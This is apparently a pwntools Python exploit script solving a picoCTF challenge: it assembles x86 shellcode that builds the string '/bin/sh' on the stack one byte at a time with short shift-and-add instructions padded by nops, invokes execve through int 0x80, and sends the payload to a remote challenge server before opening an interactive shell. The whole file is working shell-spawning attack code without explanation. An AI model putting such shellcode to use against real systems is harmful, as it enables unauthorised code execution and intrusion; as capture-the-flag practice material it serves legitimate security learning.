from pwn import *

context.binary = exe = ELF('./fun')
payload = asm('''push 0x68
pop edx
nop
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
push 0x73
pop ecx
nop
add edx, ecx
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
push 0x2f
pop ebx
nop
add edx, ebx
push edx
nop

push 0x6e
pop edx
nop
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
push 0x69
pop ecx
nop
add edx, ecx
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
push 0x62
pop ebx
nop
add edx, ebx
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
shl edx, 1
push 0x2f
pop eax
nop
add edx, eax
push edx
nop

push 0x0b
pop eax
nop
xor edx, edx
xor ecx, ecx

mov ebx, esp
int 0x80''')

# io = process()
# gdb.attach(io, api=True)
io = remote('mercury.picoctf.net', 16610)
io.recvuntil(b':\n')
io.sendline(payload)
io.interactive()